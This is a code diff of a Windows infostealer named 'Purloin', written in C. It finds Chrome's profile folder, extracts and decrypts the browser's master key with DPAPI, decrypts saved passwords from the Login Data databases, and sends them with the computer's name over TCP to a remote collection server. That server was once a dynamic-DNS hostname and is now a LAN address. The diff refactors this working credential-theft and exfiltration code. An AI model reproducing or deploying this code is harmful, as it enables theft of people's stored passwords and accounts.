@@ -1,6 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 
-#include <windows.h>
+//#include <windows.h>
 //#include <winsqlite/winsqlite3.h>
 #include <sqlite3.h>
 #include <stdio.h>
@@ -11,17 +11,21 @@
 #include <stdlib.h>
 #include <bcrypt.h>
 #include <string.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
+//#include <winsock2.h>
+//#include <ws2tcpip.h>
 #include <dpapi.h>
 #include <wincrypt.h>
+#include "Purloin_Debug.h"
+#include "Purloin_Server.h"
+#include "Purloin_Browser.h"
 
 #define ENC_MASTER_KEY_LEN 357
 #define IV_LEN 12
 #define TAG_LEN 16
 #define CIPHER_LEN 300
 #define DEFAULT_BUFLEN 512
-#define SERVER_IP "purloin2.sytes.net"
+//#define SERVER_IP "purloin2.sytes.net"
+#define SERVER_IP "192.168.8.101"
 #define DEFAULT_PORT "25565"
 
 #ifndef NT_SUCCESS
@@ -33,12 +37,12 @@
 #pragma comment (lib, "AdvApi32.lib")
 #pragma comment (lib, "Wlanapi.lib")
 
-SOCKET ConnectSocket = INVALID_SOCKET;
 CHAR tcp_send_buffer[DEFAULT_BUFLEN];
+SOCKET ConnectSocket = INVALID_SOCKET;
 
-BOOL get_chrome_directory(PWSTR buffer, SIZE_T buffer_size);
-BOOL get_enc_masterkey(PCWSTR chrome_dir, PWCHAR enc_master_key);
-BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* handle_bcrypt);
+BOOL connect(SOCKET* ConnectSocket, PCSTR server_ip, PCSTR server_port);
+
+//BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* handle_bcrypt);
 BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle);
 BOOL is_substring_in(const CHAR* substring, PCHAR test_string);
 BOOL open_database_conn(PSTR chrome_dir_char, PSTR profile_name, sqlite3** handle_db);
@@ -53,7 +57,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	/* These variables are used to retrieve chrome paths, directories, master key etc. */
 	WCHAR chrome_dir[MAX_PATH] = { L'\0' }, enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };	// Buffer to hold Google Chrome directory, and Encrypted master key (encrypted using CryptProtectData())
 	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR (Later it will be used to get profile paths to get Login Data db
-	BCRYPT_KEY_HANDLE handle_bcrypt;														// Handle to AES-GCM decrypting algorithm
+	
 	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
 	HANDLE dir_handle;																		// Handle to a directory/file
 
@@ -62,28 +66,35 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	sqlite3_stmt* sql_stmt;																	// Handle to SQLite Query Statement
 	int status;
 
+	/* Connect to the server */
+	if (!connect(&ConnectSocket, SERVER_IP, DEFAULT_PORT)) {
+		return FALSE;
+	}
+
+	// Get computer name and send it
+	DWORD len_machine_name = MAX_COMPUTERNAME_LENGTH + 1;
+	CHAR machine_name[MAX_COMPUTERNAME_LENGTH + 1];
+	if (GetComputerNameA(machine_name, &len_machine_name) == 0)
+		sprintf_s(machine_name, len_machine_name, "<error-getting-hostname>");
+	sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "-------- GOT CONNECTION FROM (%s) --------\n", machine_name);
+	sendData(tcp_send_buffer);
+
 	/* These are used to decrypt the passwords in database */
 	BYTE* data_blob;																		// Variable to hold the retrieved bytes of encrypted password (Which contains password version, IV, cipher text and the tag)
 	int data_blob_size;																		// To hold the size of bytes of the encrypted password
 	ULONG decrypted_credential_size = CIPHER_LEN, default_cipher_text_size = CIPHER_LEN;	// To hold the size of cipher text and the decrypted password size
 	BYTE* cipher_text_byte = (BYTE*)malloc(default_cipher_text_size);						// Allocate a buffer to hold the cipher text (actual encrypted password)
-
-	/* Connect to the server */
-	if (!connect_to_serv(&ConnectSocket)) {
-		return FALSE;
-	}
-
 	if (!cipher_text_byte) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'cipher_text_byte'\n");
-		sendData(tcp_send_buffer);
+		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'cipher_text_byte'\n");)
+		Debug(send(tcp_send_buffer, ConnectSocket);)
 		return FALSE;
 	}
 	memset(cipher_text_byte, 0, default_cipher_text_size);
 	BYTE* tmp_cipher_text_byte;																// Temporary pointer in case if the size of the cipher text buffer is not enough, (to reallocate)
 	BYTE* decrypted_credential = (BYTE*)malloc(decrypted_credential_size);					// Allocate a buffer to hold the decrypted password in byte form
 	if (!decrypted_credential) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'decrypted_credential'\n");
-		sendData(tcp_send_buffer);
+		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'decrypted_credential'\n");)
+		Debug(send(tcp_send_buffer, ConnectSocket);)
 		return FALSE;
 	}
 	memset(decrypted_credential, 0, decrypted_credential_size);
@@ -91,23 +102,22 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 
 
 	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
-	if (!get_chrome_directory(chrome_dir, MAX_PATH)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting chrome path error\n");
-		sendData(tcp_send_buffer);
+	if (!get_browser_dir(FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data\\", chrome_dir, tcp_send_buffer, DEFAULT_BUFLEN)) {
+		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
 
 	/* Gets the Master Key of Chrome, which is inside% LOCALAPPDATA% \Google\Chrome\User Data\Local State */
-	if (!get_enc_masterkey(chrome_dir, enc_master_key)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting 'Encrypted Master Key' error\n");
-		sendData(tcp_send_buffer);
+	if (!get_encrypted_masterkey(chrome_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, tcp_send_buffer, DEFAULT_BUFLEN)) {
+		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
 
 	/* Decrypts the Master keyand returns a AES - GCM decrypting algorithm to decrypt passwords. */
-	if (!decrypt_masterkey(enc_master_key, &handle_bcrypt)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Decrypting 'Master Key' error\n");
-		sendData(tcp_send_buffer);
+	BCRYPT_KEY_HANDLE handle_bcrypt;			
+	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key// Handle to AES-GCM decrypting algorithm
+	if (!decrypt_masterkey_and_ret(enc_master_key, char_master_key, ENC_MASTER_KEY_LEN, &handle_bcrypt, tcp_send_buffer, DEFAULT_BUFLEN)) {
+		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
 
@@ -200,128 +210,9 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	/* Free allocated memory to prevent leaks */
 	free(cipher_text_byte);
 	free(decrypted_credential);
-	closeConnection();
+	close(ConnectSocket);
 	//_CrtDumpMemoryLeaks();
 	return 0;
-}
-
-BOOL get_chrome_directory(PWSTR buffer, SIZE_T buffer_size) {
-	PWSTR p_temp_chrome_dir;																	// Temporary pointer to hold returned %LOCALAPPDATA% folder path
-	HRESULT hr;																					// Error handling 
-	errno_t err;																				// Error handling 
-
-	/* Get Local Appdata Directory of the user */
-	if (FAILED(hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &p_temp_chrome_dir))) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "SHGetKnownFolderPath: Getting Local Appdata Directory error code: %d\n", hr);
-		sendData(tcp_send_buffer);
-		CoTaskMemFree(p_temp_chrome_dir);
-		return FALSE;
-	}
-
-	/* Copy %LOCALAPPDATA% location to permenant buffer */
-	if ((err = wmemcpy_s(buffer, buffer_size, p_temp_chrome_dir, lstrlenW(p_temp_chrome_dir))) != 0) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	/* Copy relative path of Chrome directory from %LOCALAPPDATA% to permenant buffer */
-	if ((err = wmemcpy_s(buffer + lstrlenW(p_temp_chrome_dir), buffer_size, L"\\Google\\Chrome\\User Data", 25)) != 0) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	/* Check if that Chrome path exitsts */
-	if (!PathFileExistsW(buffer)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "PathFileExistsW: No folder found.\n");
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	/* Free the memory allocated by temporary buffer to hold the %LOCALAPPDATA% folder */
-	CoTaskMemFree(p_temp_chrome_dir);
-	return TRUE;
-}
-
-BOOL get_enc_masterkey(PCWSTR chrome_dir, PWCHAR enc_master_key) {
-	FILE* fp_local_state_file = NULL;												// File pointer to 'Local State' file
-	WCHAR local_state_location[MAX_PATH], buffer[2];								// First Buffer to hold path for 'Local State' file, and the second buffer to hold two wchars (including null-term). Buffer is used to read file
-	BOOL quoteFound = FALSE, propertyFound = FALSE;
-	errno_t err;
-	int i = 0;
-
-	/* Copy chrome path to temporary buffer */
-	if ((err = wmemcpy_s(local_state_location, MAX_PATH, chrome_dir, lstrlenW(chrome_dir))) != 0) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wmemcpy_s: Copying Chrome path to buffer error code: %d\n", err);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	/* Add '\Local State' to temporary buffer */
-	if ((err = wmemcpy_s(local_state_location + lstrlenW(chrome_dir), MAX_PATH, L"\\Local State", 13)) != 0) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wmemcpy_s: Copying 'Local State' file path to buffer error code: %d\n", err);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	/* Check if Local State file exists */
-	if (!PathFileExistsW(local_state_location)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "PathFileExistsW: No 'Local State' file found.\n");
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	/* Opens the 'Local State' file in UTF-8 mode */
-	if ((err = _wfopen_s(&fp_local_state_file, local_state_location, L"r, ccs=UTF-8")) != 0) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "_wfopen_s: Opening Local State file error code: %d:%d\n", err, errno);
-		sendData(tcp_send_buffer);
-	}
-	if (fp_local_state_file == NULL) {
-		_wcserror_s(enc_master_key, ENC_MASTER_KEY_LEN, err);
-		return FALSE;
-	}
-
-	/* Read and get the encrypted key */
-	while (fgetws(buffer, 2, fp_local_state_file)) {
-		if (!wcscmp(buffer, L"\"")) {
-			if (!quoteFound) {
-				quoteFound = TRUE;
-				continue;
-			}
-			else {
-				quoteFound = FALSE;
-				if (!wcscmp(enc_master_key, L"encrypted_key")) {
-					wmemset(enc_master_key, L'\0', ENC_MASTER_KEY_LEN);
-					i = 0;
-					propertyFound = TRUE;
-					continue;
-				}
-				if (propertyFound) {
-					enc_master_key[i] = (WCHAR)L'\0';
-					if ((err = fclose(fp_local_state_file)) != 0) {
-						sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "fclose: Local File closing error code: %d\n", err);
-						sendData(tcp_send_buffer);
-					}
-					return TRUE;
-				}
-				enc_master_key[i] = L'\0';
-				wmemset(enc_master_key, L'\0', ENC_MASTER_KEY_LEN);
-				i = 0;
-			}
-		}
-		else if (quoteFound) {
-			enc_master_key[i] = buffer[0];
-			i++;
-		}
-	}
-
-	/* If encrypted key is not found */
-	if ((err = fclose(fp_local_state_file)) != 0) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "fclose: Local File closing error code: %d\n", err);
-		sendData(tcp_send_buffer);
-	}
-	return FALSE;
 }
 
 BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* p_handle_key) {
@@ -564,75 +455,6 @@ BOOL get_credentials(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE** enc_password, int* 
 	return TRUE;
 }
 
-BOOL connect_to_serv(SOCKET* ConnectSocket) {
-	WSADATA wsaData;
-	struct addrinfo* result = NULL,
-		* ptr = NULL,
-		hints;
-	//char recvbuf[DEFAULT_BUFLEN];
-	int iResult;
-	DWORD len_machine_name = MAX_COMPUTERNAME_LENGTH + 1;
-	CHAR machine_name[MAX_COMPUTERNAME_LENGTH + 1];
-	//int recvbuflen = DEFAULT_BUFLEN;
-
-	// Initialize Winsock
-	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	if (iResult != 0) {
-		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "WSAStartup failed with error: %d\n", iResult);
-		return FALSE;
-	}
-
-	ZeroMemory(&hints, sizeof(hints));
-	hints.ai_family = AF_UNSPEC;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_protocol = IPPROTO_TCP;
-
-	// Resolve the server address and port
-	iResult = getaddrinfo(SERVER_IP, DEFAULT_PORT, &hints, &result);
-	if (iResult != 0) {
-		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "getaddrinfo failed with error: %d\n", iResult);
-		WSACleanup();
-		return FALSE;
-	}
-
-	// Attempt to connect to an address until one succeeds
-	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
-
-		// Create a SOCKET for connecting to server
-		*ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
-			ptr->ai_protocol);
-		if (*ConnectSocket == INVALID_SOCKET) {
-			// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "socket failed with error: %ld\n", WSAGetLastError());
-			WSACleanup();
-			return FALSE;
-		}
-
-		// Connect to server.
-		iResult = connect(*ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-		if (iResult == SOCKET_ERROR) {
-			closesocket(*ConnectSocket);
-			*ConnectSocket = INVALID_SOCKET;
-			continue;
-		}
-
-		// Get computer name and send it
-		if (GetComputerNameA(machine_name, &len_machine_name) == 0)
-			sprintf_s(machine_name, len_machine_name, "<error-getting-hostname>");
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "-------- GOT CONNECTION FROM (%s) --------\n", machine_name);
-		sendData(tcp_send_buffer);
-
-		break;
-	}
-
-	freeaddrinfo(result);
-
-	if (*ConnectSocket == INVALID_SOCKET) {
-		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Unable to connect to server!\n");
-		WSACleanup();
-		return FALSE;
-	}
-}
-
 void sendData(char* data) {
 	// Send an initial buffer
 	int iResult;
@@ -644,20 +466,5 @@ void sendData(char* data) {
 		WSACleanup();
 	}
 	memset(data, 0, DEFAULT_BUFLEN);
-}
-
-void closeConnection() {
-	// shutdown the connection since no more data will be sent
-	int iResult;
-	iResult = shutdown(ConnectSocket, SD_SEND);
-	if (iResult == SOCKET_ERROR) {
-		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "shutdown failed with error: %d\n", WSAGetLastError());
-		closesocket(ConnectSocket);
-		WSACleanup();
-	}
-
-	// cleanup
-	closesocket(ConnectSocket);
-	WSACleanup();
 }
 
